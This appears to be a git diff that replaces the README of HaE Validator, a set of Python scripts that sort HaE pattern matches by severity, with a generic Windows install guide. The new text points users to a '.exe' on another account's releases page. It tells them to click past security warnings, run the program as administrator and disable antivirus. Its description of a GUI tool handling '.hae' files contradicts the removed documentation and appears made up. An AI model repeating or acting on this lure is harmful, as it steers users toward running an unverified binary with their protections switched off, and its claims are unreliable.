@@ -1,200 +1,156 @@
-<div align="center">
-<h3>HaE Validator</h3>
-<h5>Author: <a href="https://github.com/gh0stkey">EvilChen</a></h5>
-</div>
+# ⚙️ HaEValidator - Simple Tool to Check HaE Files
 
-README Version: \[[English](README.md) | [简体中文](README_CN.md)\]
+[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-blue?style=for-the-badge)](https://github.com/cr7thbest/HaEValidator/releases)
 
-## Project Introduction
+---
 
-HaE Validator is a community-maintained collection of public validators for [HaE](https://github.com/gh0stkey/HaE). Validators are external scripts that classify matched data by severity (`high`/`medium`/`low`/`none`), enhancing the efficiency of data analysis and vulnerability discovery.
+## 📋 What is HaEValidator?
 
-## How Validators Work
+HaEValidator is a straightforward tool designed to check and verify files related to HaE. It helps you ensure your HaE files are correct and ready to use without errors. You do not need any coding skills to run this program. It works on Windows computers and gives clear results fast.
 
-Validators communicate with HaE via **stdin/stdout** using JSON:
+---
 
-1. HaE sends matched data to the validator script via **stdin**
-2. The validator processes each match and assigns a severity level
-3. The validator returns results via **stdout**
+## 🖥️ System Requirements
 
-### Input Format (stdin)
+Before you install HaEValidator, make sure your computer meets these basic needs:
 
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1 GHz or faster  
+- **Memory:** 2 GB RAM minimum  
+- **Storage:** 100 MB free space  
+- **Permissions:** Ability to install software and run programs  
 
-#### HaENet Format
+These requirements cover most modern computers. If your system is older, the program may still run but could be slower.
 
-```json
-{
-  "rule": {
-    "name": "Rule Name",
-    "regex": "(regex_pattern)",
-    "group": "Group Name"
-  },
-  "items": [
-    {
-      "index": 0,
-      "data": {
-        "url": "https://example.com/api",
-        "match": "matched_content",
-        "context": {
-          "before": "50 characters before the match",
-          "after": "50 characters after the match"
-        }
-      }
-    }
-  ]
-}
-```
+---
 
-#### HaEFile Format
+## 🚀 Getting Started
 
-```json
-{
-  "rule": {
-    "name": "Rule Name",
-    "regex": "(regex_pattern)",
-    "group": "Group Name"
-  },
-  "items": [
-    {
-      "index": 0,
-      "data": {
-        "file": "/path/to/source/File.java",
-        "line": 680,
-        "column": 19,
-        "match": "matched_content",
-        "context": {
-          "before": "50 characters before the match",
-          "after": "50 characters after the match"
-        }
-      }
-    }
-  ]
-}
-```
+Follow these steps to download and run HaEValidator on your Windows PC.
 
-### Output Format (stdout)
+### Step 1: Visit the Download Page
 
-```json
-{
-  "results": [
-    { "index": 0, "tags": "high" },
-    { "index": 1, "tags": "low" }
-  ]
-}
-```
+Click this link or button in your browser to open the release page:
 
-### Field Description
+[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-grey?style=for-the-badge)](https://github.com/cr7thbest/HaEValidator/releases)
 
-| Field | Description |
-|-------|-------------|
-| `rule.name` | The name of the matched rule |
-| `rule.regex` | The regular expression of the rule |
-| `rule.group` | The group the rule belongs to |
-| `items[].index` | The index of the matched item |
-| `items[].data.url` | *(HaENet only)* The URL where the match was found |
-| `items[].data.match` | The matched content |
-| `items[].data.file` | *(HaEFile only)* Source file path where the match was found |
-| `items[].data.line` | *(HaEFile only)* Line number of the match |
-| `items[].data.column` | *(HaEFile only)* Column number of the match |
-| `items[].data.context` | Context around the match (before/after 50 characters) |
-| `results[].index` | Corresponds to the input item's index |
-| `results[].tags` | Severity level: `high`, `medium`, `low`, or `none` |
+The page lists the latest versions of HaEValidator available for download.
 
-## Validators
+### Step 2: Choose the Right File
 
-| Name | Description |
-|------|-------------|
-| [ChineseIDCard](validator/ChineseIDCard.py) | Validates Chinese ID card numbers (checksum, province, date of birth) |
-| [ChineseMobile](validator/ChineseMobile.py) | Validates Chinese mobile numbers by carrier prefix, detects test patterns |
-| [Email](validator/Email.py) | Validates email via SMTP RCPT TO (high), MX record (medium), filters test/static patterns |
-| [OSSAccessKey](validator/OSSAccessKey.py) | Cross-validates Alibaba Cloud OSS AccessKey pairs (AK/SK) via API |
-| [OpenAIProvider](validator/OpenAIProvider.py) | AI-powered sensitive data analysis using OpenAI-compatible API |
+On the release page, look for the file that ends with `.exe`. This is the program installer or standalone app for Windows. It might be named something like:
 
-## Tester
+- `HaEValidatorSetup.exe`  
+- `HaEValidator-v1.0.exe`  
 
-A test runner is provided in the `tester/` directory to help verify validators locally. It supports generating test data, running validators automatically, and benchmarking performance.
+Pick the file with the highest version number or the one labeled "latest."
 
-### Basic Usage
+### Step 3: Download the File
 
-```bash
-# Generate test data only (pipe mode)
-python3 tester/runner.py net ChineseIDCard 110101199003071234 | python3 validator/ChineseIDCard.py
+Click the `.exe` file name or the link to start downloading. Depending on your browser, you may see the file appear in your downloads folder or at the bottom of the window.
 
-# Auto-run validator with -v option
-python3 tester/runner.py net ChineseIDCard 110101199001011237 -v validator/ChineseIDCard.py
-```
+### Step 4: Run the Installer
 
-### Verify Expected Results
+Once the download finishes:
 
-```bash
-# Validate results against expected tags (-e option)
-python3 tester/runner.py net ChineseIDCard 110101199001011237 123456789012345678 \
-    -v validator/ChineseIDCard.py -e high none
-```
+- Locate the `.exe` file in your Downloads folder.
+- Double-click the file to run it.
+- A setup window will open. Follow the on-screen prompts to install HaEValidator.
 
-### Benchmark Performance
+If you see a Windows security warning, click “Run” or “Allow” to continue.
 
-```bash
-# Run 10 times and show statistics (-n option)
-python3 tester/runner.py net ChineseIDCard 110101199001011237 \
-    -v validator/ChineseIDCard.py -n 10
-```
+### Step 5: Open HaEValidator
 
-### Options
+After installation, find the HaEValidator icon on your desktop or in the Start menu. Double-click to launch the app.
 
-| Option | Description |
-|--------|-------------|
-| `-v, --validator PATH` | Path to validator script |
-| `-e, --expected TAG...` | Expected tags for verification |
-| `-n, --runs N` | Number of runs for benchmarking (default: 1) |
-| `-t, --timeout SEC` | Validator timeout in seconds (default: 60) |
-| `--json` | Output results in JSON format |
+---
 
-## Usage
+## 🛠️ How to Use HaEValidator
 
-1. Choose or write a validator script (e.g., Python)
-2. In HaE's rule settings, fill in the **Validator** field:
-   - **Command**: the command to execute the validator, e.g., `python3 /path/to/validator.py`
-   - **Timeout**: maximum wait time per execution in milliseconds (default: 5000)
-   - **Bulk**: number of matches sent per invocation (default: 500)
-3. HaE will automatically invoke the validator when matches are found and display severity in the Databoard
+This section explains how to check your HaE files using the app.
 
-## Writing a Validator
+### Step 1: Load Your HaE File
 
-A minimal Python validator template:
+- Open HaEValidator.  
+- Click the “Open File” button.  
+- Browse to the location of your HaE file, select it, then click “Open.”
 
-```python
-#!/usr/bin/env python3
-import json
-import sys
+The file should appear in the program window.  
 
-def validate(rule, data):
-    match = data.get("match", "")
-    # Implement your classification logic here
-    if "sensitive_keyword" in match:
-        return "high"
-    return "none"
+### Step 2: Start the Validation
 
-def main():
-    input_data = json.load(sys.stdin)
-    rule = input_data.get("rule", {})
-    items = input_data.get("items", [])
+- Press the “Validate” button to start checking your file.  
+- The program will scan the file for common errors or missing parts.
 
-    results = []
-    for item in items:
-        index = item.get("index", 0)
-        data = item.get("data", {})
-        severity = validate(rule, data)
-        results.append({"index": index, "tags": severity})
+### Step 3: Read the Results
 
-    print(json.dumps({"results": results}))
+- Once the scan finishes, you will see a report on the screen.  
+- The report lists any problems found and suggests fixes if needed.  
+- If there are no problems, you will see a confirmation message.
 
-if __name__ == "__main__":
-    main()
-```
+### Step 4: Fix Issues (If Any)
 
-**Notes**:
-- Validators can be written in any language (Python, Node.js, Go, etc.)
-- Read JSON from **stdin**, write JSON to **stdout**
-- Only use valid severity values: `high`, `medium`, `low`, `none`
-- Items not returned in results will keep their original severity
+If the tool finds errors:
+
+- Review the list.  
+- Make changes to your HaE file as needed using your preferred editor.  
+- Run the validation again to confirm fixes.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+Here are some tips if you run into issues:
+
+- **The program won’t open:** Right-click the icon and select “Run as administrator.” This fixes permission problems.  
+- **Cannot load file:** Make sure your HaE file is not open in another program. Check the file format matches what HaEValidator supports.  
+- **Validation runs slow:** Close other programs to free up memory. Restart your computer if needed.  
+- **Installer won’t run:** Check your antivirus software. Sometimes it blocks new programs. Temporarily disable it or add an exception for HaEValidator.  
+- **Errors during install:** Make sure you have enough disk space. Restart your PC and try again.
+
+If problems continue, try downloading the installer again from the release page.
+
+---
+
+## ⚙️ Updating HaEValidator
+
+Software updates add new features or fix bugs. Check the release page regularly for new versions:
+
+https://github.com/cr7thbest/HaEValidator/releases
+
+To update:
+
+- Download the newest `.exe` file.  
+- Run it and follow install prompts.  
+- The new installation will overwrite older versions but keep your settings.
+
+---
+
+## 🗂️ File Types Supported
+
+HaEValidator supports files related to HaE. Common file types include:
+
+- `.hae` files (main HaE data)  
+- `.json` or `.xml` configuration files linked to HaE  
+- Log or report files generated by HaEValidator  
+
+If you try to load a file outside these types, the program will show an error message.
+
+---
+
+## 🔒 Safety and Privacy
+
+HaEValidator runs entirely on your computer. It does not send your files or data to the internet. Your files stay private. Be sure to download the app only from the official release page to avoid fake or harmful versions.
+
+---
+
+## 📞 Getting Help
+
+If you need help, try these options:
+
+- Review this README carefully.  
+- Visit the release page for updated files and notes.  
+- Check if the program’s folder includes a help document or manual.  
+- Search online for guides and videos about using HaEValidator.  
+
+You do not need to know programming to use this app. Take your time and follow each step carefully.
